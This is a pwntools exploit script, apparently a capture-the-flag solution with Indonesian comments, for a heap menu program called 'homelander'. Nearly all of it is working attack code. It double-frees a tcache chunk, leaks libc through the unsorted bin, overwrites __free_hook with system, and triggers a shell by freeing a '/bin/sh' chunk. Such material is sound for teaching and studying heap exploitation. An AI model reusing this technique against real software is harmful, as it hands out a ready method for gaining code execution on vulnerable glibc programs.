from pwn import *

p = process("./homelander")

def add_page(page, size, text):
    p.sendlineafter("Choice: ", "1")
    p.sendlineafter("Enter page number (1-16): ", str(page))
    p.sendlineafter("Length: ", str(size))
    p.sendlineafter("Text: ", text)

def edit_page(page, text):
    p.sendlineafter("Choice: ", "2")
    p.sendlineafter("Enter page number (1-16): ", str(page))
    p.sendlineafter("New text: ", text)

def view(page):
    p.sendlineafter("Choice: ", "3")
    p.sendlineafter("Enter page number (1-16): ", str(page))
    p.recvuntil("Dear diary,\n")
    return u64(p.recvline()[:-1].ljust(8, "\x00"))

def erase(page):
    p.sendlineafter("Choice: ", "4")
    p.sendlineafter("Enter page number (1-16): ", str(page))

def exploit():
    libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
    for i in range(1, 9): # Menambahkan 1 chunk pada page ke 8 sehingga saat melakukan free pada page ke 7 tidak bergabung dengan top chunk
        add_page(i, 0xa0, "A" * 0x8)
        log.info("Adding memory {}".format(i))

    for i in range(1, 8): # Free 7 tcache bin, sehingga pada free selanjutnya akan masuk ke unsorted bin dan libc fd ptr
                          # akan ter-write pada address yang di-free saat masuk ke unsorted bin
        erase(i)
        log.info("Adding tcache bins on index {} or on page {}".format(i - 1, i))
    
    erase(7) # Free selanjutnya akan masuk ke unsorted bin dan fd pointer akan tertulis di address page ke-7 sekaligus
             # melakukan double free
             # Karena kita sudah melakukan, maka top of the free list akan menjadi free list loop, namun karena fd ptr 
             # sudah tertulis pada address page ke - 7, maka sebagai contoh, free list akan di anggap sebagai berikut 
             # Free-list = [0x00005597e2abc680, *fd_ptr, &fd_ptr] dan fd_ptr merupakan address dari libc
             # sehingga kita bisa mendapatkan leak libc pada page ke-7
             # Jika kita melakukan edit pada index ke 7 menjadi address dari libc __free_hook, maka
             # free-list akan menjadi seperti ini 
             # Free-list = [0x00005597e2abc680, address_libc__free_hook]
             # address 0x00005597e2abc680 tidak akan terhapus dari free-list karena kita tidak melakukan free, melainkan edit

    libc_leak = view(7) # leak libc 
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - 0x3ebca0
    log.info("Libc base : {}".format(hex(libc.address)))
    libc_free_hook = libc.symbols["__free_hook"]
    log.info("Libc free : {}".format(hex(libc_free_hook)))
    libc_system = libc.symbols["system"]
    log.info("Libc system : {}".format(hex(libc_system)))

    # Setelah mendapatkan libc, kita tinggal melakukan tcache poisoning
    # tcache poisoning bisa di lakukan pada binary yang menggunakan libc > 2.26

    edit_page(7, p64(libc_free_hook)) # Mengganti top of the free list sehingga free-list menjadi seperti berikut
                                      # [0x00005597e2abc680, address_libc__free_hook]
    add_page(10, 0xa0, "/bin/sh")     # Malloc selanjutnya untuk mengurangi free-list sekaligus menulis "/bin/sh", 
                                      # free-list akan menjadi seperti ini: 
                                      # [address_libc__free_hook], sehingga ada malloc selanjutnya kita akan melakukan
                                      # alokasi memori pada address libc__free_hook
    
    add_page(11, 0xa0, p64(libc_system)) # Mengalokasikan memori pada address libc__free_hook sehingga pada saat memanggil 
                                         # __free_hook akan memanggil system
    log.info("Overwriting __free_hook to system")
    sleep(1)
    log.info("We got the Shell")
    erase(10)
    # gdb.attach(p, "start")

    p.interactive()

if __name__ == "__main__":
    exploit() 
